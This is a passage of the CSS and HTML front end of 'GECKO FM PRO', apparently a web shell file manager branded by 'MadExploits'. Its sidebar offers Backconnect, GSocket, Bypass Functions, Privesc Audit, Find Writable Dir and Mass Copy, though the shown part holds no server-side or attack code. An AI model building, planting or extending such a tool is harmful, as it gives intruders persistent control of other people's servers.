  flex-shrink: 0; opacity: .65;
  letter-spacing: .04em;
}
.term-hint .kbd {
  padding: 1px 6px; border-radius: 3px;
  background: var(--ink3); border: 1px solid var(--bd2);
  color: var(--tx3); font-weight: 700;
  margin-right: 3px;
}

@media (max-width: 720px) {
  .term-title-area { display: none }
  .term-hint { display: none }
  .term-stats { display: none }
  .term-prompt-host, .term-prompt-at { display: none }
  .term-in-row { padding: 12px 14px; gap: 8px }
  .term-out { padding: 14px 14px 10px }
}

/* ─── CONTEXT MENU ────────────────────────────────────────────── */
.ctx {
  position: fixed; z-index: 300;
  background: linear-gradient(180deg, var(--ink3), var(--ink2));
  border: 1px solid var(--bd2);
  border-radius: var(--r12);
  box-shadow: var(--s3), 0 0 0 1px rgba(255,255,255,.02) inset;
  min-width: 200px; padding: 5px; display: none;
  transform-origin: top left;
  animation: ctxPop .14s var(--spring);
}
@keyframes ctxPop {
  from { opacity: 0; transform: scale(.94) translateY(-2px) }
  to   { opacity: 1; transform: scale(1) translateY(0) }
}
.ctx.open { display: block }
.ci {
  display: flex; align-items: center; gap: 10px;
  padding: 8px 12px; font-size: 12.5px; font-weight: 500;
  border-radius: var(--r8); cursor: pointer; color: var(--tx2);
  border: none; background: transparent;
  width: 100%; text-align: left;
  transition: background-color .1s var(--ease), color .1s var(--ease);
}
.ci:hover { background: var(--jade-bg); color: var(--tx) }
.ci.danger:hover { background: var(--red-bg); color: var(--red) }
.ci svg { width: 13px; height: 13px; fill: currentColor; opacity: .75 }
.ci:hover svg { opacity: 1 }
.ctx-sep { height: 1px; background: var(--bd2); margin: 4px 6px }
.ci.disabled, .ci:disabled { opacity: .4; pointer-events: none }
.clip-indicator {
  font-size: 10px; color: var(--jade); padding: 4px 12px 8px;
  font-family: var(--mono); letter-spacing: .04em;
}

/* ─── TOASTS ──────────────────────────────────────────────────── */
.toasts {
  position: fixed; bottom: 20px; right: 20px; z-index: 400;
  display: flex; flex-direction: column-reverse; gap: 8px;
  pointer-events: none;
}
.toast {
  padding: 11px 14px 11px 12px;
  background: linear-gradient(180deg, var(--ink3), var(--ink2));
  border: 1px solid var(--bd2);
  border-radius: var(--r10);
  box-shadow: var(--s2), 0 0 0 1px rgba(255,255,255,.02) inset;
  font-size: 12.5px; font-weight: 500;
  color: var(--tx);
  display: flex; align-items: center; gap: 11px;
  pointer-events: auto; max-width: 380px;
  animation: toastIn .26s var(--spring);
}
@keyframes toastIn {
  from { opacity: 0; transform: translateX(20px) scale(.96) }
  to   { opacity: 1; transform: translateX(0) scale(1) }
}
.t-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0 }
.toast.ok { border-color: var(--jade-bd) }
.toast.ok .t-dot { background: var(--jade); box-shadow: 0 0 0 3px var(--jade-bg), 0 0 8px var(--jade) }
.toast.err { border-color: var(--red-bd) }
.toast.err .t-dot { background: var(--red); box-shadow: 0 0 0 3px var(--red-bg), 0 0 8px var(--red) }

/* ─── SEARCH RESULTS ──────────────────────────────────────────── */
.sr-list {
  position: absolute; top: calc(100% + 8px); left: 0; right: 0;
  background: linear-gradient(180deg, var(--ink3), var(--ink2));
  border: 1px solid var(--bd2);
  border-radius: var(--r12);
  box-shadow: var(--s3);
  max-height: 360px; overflow-y: auto; z-index: 150;
  padding: 5px; display: none;
  animation: ctxPop .15s var(--spring);
}
.sr-list.open { display: block }
.sr-item {
  display: flex; align-items: center; gap: 11px;
  padding: 9px 11px; font-size: 12.5px;
  border-radius: var(--r8);
  cursor: pointer;
  transition: background-color .1s var(--ease);
}
.sr-item:hover { background: var(--jade-bg) }
.sr-path {
  font-size: 10.5px; color: var(--tx3);
  font-family: var(--mono);
  margin-left: auto; max-width: 50%;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}

/* ─── DROPZONE ────────────────────────────────────────────────── */
.dropzone {
  border: 2px dashed var(--bd2);
  border-radius: var(--r16);
  padding: 50px 24px; text-align: center; color: var(--tx3);
  cursor: pointer;
  background:
    radial-gradient(ellipse 300px 200px at 50% 0%, rgba(245,185,66,.04), transparent 70%),
    var(--ink3);
  transition: border-color .15s var(--ease), background-color .15s var(--ease), transform .15s var(--ease-out);
}
.dropzone:hover {
  border-color: var(--jade-bd2);
  background: var(--jade-bg);
}
.dropzone.over {
  border-color: var(--jade);
  background: var(--jade-bg);
  transform: scale(1.005);
  box-shadow: 0 0 0 4px rgba(245,185,66,.06), inset 0 0 40px rgba(245,185,66,.05);
}
.dropzone svg { width: 44px; height: 44px; fill: var(--jade); opacity: .55; margin-bottom: 14px }
.dropzone:hover svg, .dropzone.over svg { opacity: 1 }
.dropzone strong { color: var(--jade) }

/* ─── UTILITIES ───────────────────────────────────────────────── */
.spin { animation: spin .7s linear infinite }
@keyframes spin { to { transform: rotate(360deg) } }
.hidden { display: none !important }

/* ─── HAMBURGER (mobile only) ─────────────────────────────────── */
.btn-burger {
  display: none;
  width: 38px; height: 38px;
  align-items: center; justify-content: center;
  border: 1px solid var(--bd2);
  background: var(--ink2);
  border-radius: var(--r8);
  cursor: pointer; flex-shrink: 0;
  color: var(--tx2);
  transition: background-color .15s var(--ease), border-color .15s var(--ease), color .15s var(--ease);
}
.btn-burger:hover {
  background: var(--ink3); color: var(--jade);
  border-color: var(--jade-bd);
}
.btn-burger svg { width: 18px; height: 18px; fill: currentColor }

/* ─── UI ENHANCEMENTS ─────────────────────────────────────────── */
.sb-section { margin-bottom: 2px }
.sb-section-toggle {
  display: flex; align-items: center; gap: 8px; width: 100%;
  padding: 8px 12px; border: none; background: transparent;
  color: var(--tx3); cursor: pointer; text-align: left;
  font-size: 9px; font-weight: 800; text-transform: uppercase; letter-spacing: .16em;
}
.sb-section-toggle:hover { color: var(--jade) }
.sb-section-toggle svg.chev {
  width: 10px; height: 10px; stroke: currentColor; fill: none; stroke-width: 2.5;
  margin-left: auto; transition: transform .2s var(--ease);
}
.sb-section.open .sb-section-toggle svg.chev { transform: rotate(180deg) }
.sb-section-body {
  overflow: hidden; max-height: 0; opacity: 0;
  transition: max-height .28s var(--ease), opacity .2s var(--ease);
}
.sb-section.open .sb-section-body { max-height: 1200px; opacity: 1 }
.sb-section-body .sidebar-top { padding-top: 0 }

.fbadge {
  display: inline-block; font-size: 9px; font-weight: 700; letter-spacing: .04em;
  padding: 1px 6px; border-radius: 4px; margin-left: 6px; vertical-align: middle;
  font-family: var(--mono); text-transform: uppercase;
}
.fbadge-hidden { background: rgba(121,192,255,.12); color: var(--blue); border: 1px solid rgba(121,192,255,.22) }
.fbadge-warn { background: var(--amber-bg); color: var(--amber); border: 1px solid rgba(212,150,31,.28) }
.fbadge-new { background: var(--jade-bg); color: var(--jade); border: 1px solid var(--jade-bd) }
.fbadge-env { background: var(--red-bg); color: var(--red); border: 1px solid var(--red-bd) }
.frow-recent { background: rgba(245,185,66,.04) }
.frow-recent::before { transform: scaleY(.5); opacity: .6 }

.bc-copy-btn {
  flex-shrink: 0; margin-left: 4px;
  padding: 4px 8px; font-size: 10px; border-radius: var(--r6);
  background: var(--ink3); border: 1px solid var(--bd2); color: var(--tx3);
  cursor: pointer; font-family: var(--mono);
  transition: all .12s var(--ease);
}
.bc-copy-btn:hover { border-color: var(--jade-bd); color: var(--jade) }
.bc-ellipsis { color: var(--tx4); padding: 0 4px; user-select: none; font-family: var(--mono) }

.panel-skeleton {
  padding: 24px 16px; display: flex; flex-direction: column; gap: 10px;
}
.sk-row {
  height: 44px; border-radius: var(--r8);
  background: linear-gradient(90deg, var(--ink2) 25%, var(--ink3) 50%, var(--ink2) 75%);
  background-size: 200% 100%; animation: skShimmer 1.2s infinite;
}
@keyframes skShimmer { to { background-position: -200% 0 } }

.sec-terminal.is-scanning .sec-terminal-bar { position: relative }
.sec-terminal.is-scanning .sec-terminal-bar::after {
  content: ''; position: absolute; left: 0; right: 0; bottom: 0; height: 2px;
  background: linear-gradient(90deg, transparent, var(--jade), transparent);
  animation: scanBar 1.4s ease-in-out infinite;
}
@keyframes scanBar { 0% { transform: translateX(-100%) } 100% { transform: translateX(100%) } }
.tool-output.loading { color: var(--jade); font-style: normal }

.blue-filter-bar {
  display: none; flex-wrap: wrap; gap: 6px; margin-top: 12px;
}
.blue-filter-bar.show { display: flex }
.blue-filter {
  font-size: 10px; font-weight: 700; padding: 4px 10px; border-radius: 999px;
  border: 1px solid var(--bd2); background: var(--ink2); color: var(--tx3);
  cursor: pointer; font-family: var(--mono); transition: all .12s;
}
.blue-filter:hover { border-color: var(--jade-bd); color: var(--tx2) }
.blue-filter.active { background: var(--blue-bg); border-color: rgba(121,192,255,.3); color: var(--blue) }
.blue-filter.active[data-sev="CRITICAL"] { background: var(--red-bg); border-color: var(--red-bd); color: var(--red) }
.blue-filter.active[data-sev="HIGH"] { background: var(--amber-bg); color: var(--amber) }
.blue-threat-hits-full {
  display: none; font-size: 10px; color: var(--tx4); margin-top: 6px; line-height: 1.5;
  word-break: break-all;
}
.blue-threat-item.expanded .blue-threat-hits-full { display: block }
.blue-threat-item .blue-q-one { flex-shrink: 0; margin-left: auto }

.bulk-summary {
  font-size: 11px; color: var(--tx3); margin-right: 4px; max-width: 140px;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}

.st-path-copy { cursor: pointer; transition: color .12s }
.st-path-copy:hover { color: var(--jade) }

.ed-unsaved-dot {
  width: 8px; height: 8px; border-radius: 50%; background: var(--amber);
  display: none; box-shadow: 0 0 8px var(--amber);
}
.ed-unsaved-dot.show { display: inline-block }
.ed-area.wrap-mode #edText, .ed-area.wrap-mode #edHighlight { white-space: pre-wrap; word-wrap: break-word }

.theme-toggle.active { color: var(--blue); border-color: rgba(121,192,255,.3); background: var(--blue-bg) }
html.theme-blue {
  --jade: #79c0ff; --jade-hi: #a5d8ff; --jade-lo: #58a6ff; --jade-dk: #388bfd;
  --jade-bg: rgba(121,192,255,.10); --jade-bd: rgba(121,192,255,.24); --jade-bd2: rgba(121,192,255,.42);
}

.kbd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px 16px; margin-top: 12px }
.kbd-row { display: flex; justify-content: space-between; gap: 12px; font-size: 12px; color: var(--tx2); padding: 6px 0; border-bottom: 1px solid var(--bd3) }
.kbd-row kbd {
  font-family: var(--mono); font-size: 10px; padding: 2px 6px;
  background: var(--ink3); border: 1px solid var(--bd2); border-radius: 4px; color: var(--jade);
}

.sr-item mark { background: var(--jade-bg); color: var(--jade-hi); border-radius: 2px; padding: 0 2px }
.empty-actions { display: flex; gap: 8px; justify-content: center; flex-wrap: wrap; margin-top: 8px }

.gcard .gthumb {
  width: 48px; height: 48px; margin: 0 auto 8px; border-radius: var(--r8);
  object-fit: cover; background: var(--ink3); display: none;
}
.gcard.has-thumb .gthumb { display: block }
.gcard.has-thumb .ico-wrap { display: none }

.topbar-btn {
  width: 36px; height: 36px; display: inline-flex; align-items: center; justify-content: center;
  border: 1px solid var(--bd2); border-radius: var(--r8); background: var(--ink2);
  color: var(--tx3); cursor: pointer; transition: all .12s;
}
.topbar-btn:hover { border-color: var(--jade-bd); color: var(--jade) }
.topbar-btn svg { width: 16px; height: 16px; fill: currentColor }

/* ─── SIDEBAR BACKDROP (mobile only) ─────────────────────────── */
.sb-backdrop {
  display: none;
  position: fixed; inset: 0;
  background: rgba(3,3,4,.6);
  z-index: 89;
  opacity: 0;
  transition: opacity .22s var(--ease);
}
.sb-backdrop.open { opacity: 1 }

/* ─── RESPONSIVE ──────────────────────────────────────────────── */
@media (max-width: 960px) {
  /* Sidebar → off-canvas drawer */
  .sidebar {
    position: fixed; top: 0; left: 0; bottom: 0;
    width: min(280px, 84vw);
    z-index: 90;
    transform: translateX(-100%);
    transition: transform .26s var(--ease-out);
    box-shadow: var(--s3);
    will-change: transform;
  }
  .sidebar.open { transform: translateX(0) }
  .sb-backdrop.show { display: block }

  /* Show hamburger */
  .btn-burger { display: inline-flex }

  /* Logo: hide text but keep icon */
  .logo {
    min-width: auto; padding-right: 0;
    border-right: none; margin-right: 0;
    gap: 0;
  }
  .logo-text { display: none }

  /* Compact table — hide non-essential columns */
  .tbl-head, .frow { grid-template-columns: 36px 1fr 100px 86px }
  .tbl-head > *:nth-child(n+5),
  .frow > *:nth-child(n+5) { display: none }
}

@media (max-width: 640px) {
  .topbar { padding: 0 12px; gap: 10px }
  .search-wrap { max-width: none }
  .kbd-hint { display: none }
  .topbar-right { gap: 6px }
  .btn-term span, .btn-term { padding-left: 10px; padding-right: 10px }
  .btn-term { font-size: 0; gap: 0; padding: 8px }
  .btn-term svg { width: 16px; height: 16px }

  /* Compact table — show only checkbox + name + size */
  .tbl-head, .frow { grid-template-columns: 36px 1fr 80px }
  .tbl-head > *:nth-child(n+4),
  .frow > *:nth-child(n+4) { display: none }

  /* Status bar simplified */
  .statusbar { gap: 12px; padding: 0 12px; font-size: 10.5px }
  #stClock, #stDisk { display: none }

  /* Action bar tighter */
  .actionbar { padding: 8px 12px; gap: 6px }
  .breadcrumb { padding: 4px 6px; min-height: 36px }
  .bc-btn { padding: 3px 7px; font-size: 11.5px }

  /* Modals: full width with slight padding */
  .overlay { padding: 12px }
  .modal-head { padding: 12px 14px }
  .modal-body { padding: 14px }
  .modal-foot { padding: 11px 14px }
}

@media (max-width: 420px) {
  .topbar { padding: 0 8px }
  .search-wrap input { padding: 9px 12px 9px 34px }
  .view-pills { display: none }
  .btn-burger { width: 36px; height: 36px }
}
</style>
</head>
<body>
<div class="bg-mesh" aria-hidden="true"></div>
<div class="shell">

<header class="topbar">
  <button class="btn-burger" id="btnBurger" aria-label="Toggle menu" aria-controls="sidebar" aria-expanded="false">
    <svg viewBox="0 0 24 24"><path d="M3 6.5A1.5 1.5 0 0 1 4.5 5h15a1.5 1.5 0 0 1 0 3h-15A1.5 1.5 0 0 1 3 6.5Zm0 5.5A1.5 1.5 0 0 1 4.5 10.5h15a1.5 1.5 0 0 1 0 3h-15A1.5 1.5 0 0 1 3 12Zm1.5 4A1.5 1.5 0 0 0 3 17.5 1.5 1.5 0 0 0 4.5 19h15a1.5 1.5 0 0 0 0-3h-15Z"/></svg>
  </button>

  <div class="logo">
    <div class="logo-icon" aria-hidden="true">
      <svg viewBox="0 0 24 24" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
        <path d="M5 8l4 4-4 4"/>
        <path d="M12 16h7"/>
      </svg>
    </div>
    <div class="logo-text">
      <div class="logo-name">GECKO FM <em>PRO</em></div>
      <div class="logo-sub">by <b>MadExploits</b></div>
    </div>
  </div>

  <div class="search-wrap">
    <svg class="search-ico" viewBox="0 0 16 16"><path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"/></svg>
    <input type="search" id="searchInput" placeholder="Search files…" autocomplete="off">
    <div class="kbd-hint"><kbd>Ctrl</kbd><kbd>K</kbd></div>
    <div class="sr-list" id="srList"></div>
  </div>

  <div class="topbar-right">
    <button class="topbar-btn theme-toggle" id="btnTheme" title="Toggle accent theme"><svg viewBox="0 0 16 16"><path d="M8 1.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Z"/></svg></button>
    <button class="topbar-btn" id="btnRefresh" title="Refresh (F5)"><svg viewBox="0 0 16 16"><path d="M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.745l-1.067-1.067A.25.25 0 0 1 11.5 10.25H16v4.5a.25.25 0 0 1-.427.177l-1.068-1.068a7.002 7.002 0 0 1-11.772-3.603.75.75 0 0 1 .672-.751ZM.75 8.005a.75.75 0 0 1 1.072-.696 7.002 7.002 0 0 1 11.772 3.603.75.75 0 0 1-.672.751 5.502 5.502 0 0 0-9.592-2.745L3.545 11.64A.25.25 0 0 1 3.118 12H0V7.5a.25.25 0 0 1 .427-.177l1.068 1.068A6.999 6.999 0 0 1 .75 8.005Z"/></svg></button>
    <button class="topbar-btn" id="btnHelp" title="Keyboard shortcuts (?)"><svg viewBox="0 0 16 16"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5A6.5 6.5 0 0 0 1.5 8 6.5 6.5 0 1 0 8 1.5ZM6.25 5.25c0-.966.784-1.75 1.75-1.75.966 0 1.75.784 1.75 1.75 0 .575-.279 1.087-.712 1.407-.42.31-.863.647-.863 1.218v.625a.75.75 0 0 1-1.5 0v-.625c0-1.075.784-1.588 1.257-1.938.233-.172.318-.285.318-.462Zm-.937 4.938a.75.75 0 1 1 1.5 0 .75.75 0 0 1-1.5 0Z"/></svg></button>
    <div class="view-pills">
      <button class="view-pill" id="btnList" title="List view">
        <svg viewBox="0 0 16 16"><path d="M2 2.75A.75.75 0 0 1 2.75 2h10.5a.75.75 0 0 1 0 1.5H2.75A.75.75 0 0 1 2 2.75Zm0 5A.75.75 0 0 1 2.75 7h10.5a.75.75 0 0 1 0 1.5H2.75A.75.75 0 0 1 2 7.75ZM2.75 12h10.5a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5Z"/></svg>
      </button>
      <button class="view-pill" id="btnGrid" title="Grid view">
        <svg viewBox="0 0 16 16"><path d="M1 2.75A1.75 1.75 0 0 1 2.75 1h2.5A1.75 1.75 0 0 1 7 2.75v2.5A1.75 1.75 0 0 1 5.25 7h-2.5A1.75 1.75 0 0 1 1 5.25Zm8.75-1.75A1.75 1.75 0 0 0 8 2.75v2.5A1.75 1.75 0 0 0 9.75 7h2.5A1.75 1.75 0 0 0 14 5.25v-2.5A1.75 1.75 0 0 0 12.25 1ZM1 9.75A1.75 1.75 0 0 1 2.75 8h2.5A1.75 1.75 0 0 1 7 9.75v2.5A1.75 1.75 0 0 1 5.25 14h-2.5A1.75 1.75 0 0 1 1 12.25Zm8.75-1.75A1.75 1.75 0 0 0 8 9.75v2.5A1.75 1.75 0 0 0 9.75 14h2.5A1.75 1.75 0 0 0 14 12.25v-2.5A1.75 1.75 0 0 0 12.25 8Z"/></svg>
      </button>
    </div>
    <button class="btn btn-ghost btn-icon" id="btnLogout" title="Logout">
      <svg viewBox="0 0 16 16"><path d="M2 2.75A.75.75 0 0 1 2.75 2h5.5a.75.75 0 0 1 0 1.5h-5.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h5.5a.75.75 0 0 1 0 1.5h-5.5A1.75 1.75 0 0 1 .5 12.75v-8.5C.5 3.233 1.233 2.5 2.75 2.5Zm9.22 3.47a.75.75 0 0 1 1.06 0l2.25 2.25a.75.75 0 0 1 0 1.06l-2.25 2.25a.75.75 0 1 1-1.06-1.06l.97-.97H6.75a.75.75 0 0 1 0-1.5h6.44l-.97-.97a.75.75 0 0 1 0-1.06Z"/></svg>
    </button>
    <button class="btn btn-term" id="btnTerm">
      <svg viewBox="0 0 16 16"><path d="M0 2.75C0 1.784.784 1 1.75 1h12.5c.966 0 1.75.784 1.75 1.75v10.5A1.75 1.75 0 0 1 14.25 15H1.75A1.75 1.75 0 0 1 0 13.25Zm1.75-.25a.25.25 0 0 0-.25.25v10.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V2.75a.25.25 0 0 0-.25-.25ZM7.25 8.5l-2.5 2.5a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L5.94 8 3.215 5.059A.749.749 0 0 1 4.49 4.49L7.25 7.25v1.25Zm1.5 1.5h3a.75.75 0 0 1 0 1.5h-3a.75.75 0 0 1 0-1.5Z"/></svg>
      Terminal
    </button>
  </div>
</header>

<div class="body">

  <div class="sb-backdrop" id="sbBackdrop" aria-hidden="true"></div>

  <aside class="sidebar" id="sidebar">
   <div class="sb-scroll">
    <div class="sidebar-top">
      <div class="sidebar-label">
        <svg viewBox="0 0 24 24"><path d="M12 5v14M5 12h14"/></svg>
        Files
      </div>
      <button class="sb-btn" id="sbNewFile">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M12 18v-6M9 15h6"/></svg></span>
        New File
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbNewFolder">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M3 5a2 2 0 0 1 2-2h4l2 3h7a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M12 12v4M10 14h4"/></svg></span>
        New Folder
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbUpload">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M17 8l-5-5-5 5"/><path d="M12 3v12"/></svg></span>
        Upload Files
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn danger" id="sbDelSel" aria-disabled="true">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M3 6h18"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><path d="M10 11v6M14 11v6"/></svg></span>
        Delete Selected
        <span class="sb-arrow">›</span>
      </button>
    </div>

    <div class="sidebar-divider"></div>

    <div class="sb-section open" data-sb="tools">
      <button type="button" class="sb-section-toggle" aria-expanded="true">
        <svg viewBox="0 0 24 24" width="14" height="14"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg>
        Tools
        <svg class="chev" viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></svg>
      </button>
      <div class="sb-section-body">
        <div class="sidebar-top">
          <button class="sb-btn" id="sbTerm">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 9l3 3-3 3M12 15h6"/></svg></span>
            Terminal
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbCron">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg></span>
            Cron Manager
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbBackconnect">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M9 14L4 9l5-5"/><path d="M4 9h10a5 5 0 0 1 5 5v1"/></svg></span>
            Backconnect
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbGsocket">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5M2 12l10 5 10-5"/></svg></span>
            GSocket
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbPortScan">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M7 8h4M7 12h10M7 16h7"/></svg></span>
            Port Scanner
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbAdminer">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="8" ry="3"/><path d="M4 5v14c0 1.66 3.58 3 8 3s8-1.34 8-3V5"/><path d="M4 12c0 1.66 3.58 3 8 3s8-1.34 8-3"/></svg></span>
            Adminer (DB)
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbRecover">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M3 12a9 9 0 0 1 15.18-6.36L21 8"/><path d="M21 3v5h-5"/><path d="M12 8v8M8 12h8"/></svg></span>
            Recover
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbFindWritable">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M3 7h18M3 12h18M3 17h18"/><circle cx="17" cy="17" r="3"/><path d="M21 21l-1.5-1.5"/></svg></span>
            Find Writable Dir
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbMassCopy">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1"/><path d="M8 12h8M8 16h5"/></svg></span>
            Mass Copy
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbBypassDf">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12h6M12 9v6"/></svg></span>
            Bypass Functions
            <span class="sb-arrow">›</span>
          </button>
        </div>
      </div>
    </div>

    <div class="sidebar-divider"></div>

    <div class="sb-section" data-sb="security">
      <button type="button" class="sb-section-toggle" aria-expanded="false">
        <svg viewBox="0 0 24 24" width="14" height="14"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
        Security
        <svg class="chev" viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></svg>
      </button>
      <div class="sb-section-body">
        <div class="sidebar-top">
          <button class="sb-btn" id="sbSecHub">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></span>
            Cyber Security Hub
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbBlueHub">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M12 3l7 4v5c0 5-3.5 8.5-7 9-3.5-.5-7-4-7-9V7l7-4z"/><path d="M9 12l2 2 4-4"/></svg></span>
            Blue Team Hub
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbSecRecon">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.35-4.35"/></svg></span>
            System Recon
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbSecSensitive">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M12 11v6M9 14h6"/></svg></span>
            Sensitive Scanner
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbSecHttp">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M2 12h20M12 2a15 15 0 0 1 0 20M12 2a15 15 0 0 0 0 20"/></svg></span>
            HTTP Client
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbSecPrivesc">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 8v4M12 16h.01"/></svg></span>
            Privesc Audit
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbBlueBackdoor">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M12 2a4 4 0 0 1 4 4c0 1.5-.8 2.8-2 3.5V12h3a3 3 0 0 1 3 3v1H7v-1a3 3 0 0 1 3-3h3V9.5A4 4 0 0 1 12 2z"/><path d="M9 19h6"/></svg></span>
            Backdoor Scanner
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbBluePersistence">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/><path d="M9 3h6M12 21a9 9 0 0 0 0-18"/></svg></span>
            Persistence Audit
            <span class="sb-arrow">›</span>
          </button>
          <button class="sb-btn" id="sbBlueAudit">
            <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg></span>
            Full Security Audit
            <span class="sb-arrow">›</span>
          </button>
        </div>
      </div>
    </div>

   </div><!-- /.sb-scroll -->

   <div class="sb-foot">
    <div class="drive-box" id="driveBox">
      <div class="disk-label">Path Navigation</div>
      <select id="driveSelect">
        <option value="">— Select Path —</option>
      </select>
    </div>

    <div class="disk-box" id="diskBox">
      <div class="disk-label">Storage</div>
      <div class="disk-track"><div class="disk-fill" id="diskFill" style="width:0%"></div></div>
      <div class="disk-meta"><span id="diskUsed">—</span><span id="diskPct">—</span></div>
    </div>

    <div class="sidebar-sys" id="sysInfo"><strong>Environment</strong>Loading…</div>
   </div>
  </aside>

  <main class="main">
    <div class="actionbar">
      <nav class="breadcrumb" id="breadcrumb"></nav>
      <button class="bc-copy-btn" id="btnCopyPath" title="Copy current path">Copy path</button>
      <button class="btn btn-ghost btn-icon" id="btnUp" title="Go up" style="visibility:hidden">
        <svg viewBox="0 0 16 16"><path d="m7.78 12.53-4.25-4.25a.749.749 0 0 1 0-1.061l4.25-4.25a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L4.811 7.25h7.939a.75.75 0 0 1 0 1.5H4.811l2.829 2.829a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215Z"/></svg>
      </button>
      <button class="btn btn-primary btn-sm" onclick="showCreate('file')">
        <svg viewBox="0 0 16 16"><path d="M7.75 2a.75.75 0 0 1 .75.75V7h4.25a.75.75 0 0 1 0 1.5H8.5v4.25a.75.75 0 0 1-1.5 0V8.5H2.75a.75.75 0 0 1 0-1.5H7V2.75A.75.75 0 0 1 7.75 2Z"/></svg>
        New
      </button>
    </div>

